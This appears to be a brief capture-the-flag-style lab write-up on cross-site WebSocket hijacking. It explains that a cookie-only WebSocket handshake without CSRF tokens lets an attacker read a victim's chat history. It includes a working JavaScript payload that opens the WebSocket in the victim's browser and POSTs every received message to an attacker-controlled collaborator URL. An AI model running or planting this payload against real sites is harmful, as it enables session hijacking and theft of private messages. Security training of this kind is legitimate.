# WS CSRF Lab

This lab has a vulnerability, it doesnt use any csrf tokens to handle session, only cookies. We can exploit this by getting a victims' cookie and using that in order to be able to view their previous chat history

# Method

The way we actually go about this is crafting a piece of Javascript that will basically, open a WS, send the "READY" connection message, and then make a POST HTTP request to our exploit website with the chat history. This is easier said than done.

<script>
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>

This is our exploit! as you can see, we create a websocket, send the ready message, and then whenever the victim sends a message, it will be relayed to our website we made. 

!!!Note: it's important to keep in mind that all of the JS you see will technically be run by the victim themselves.
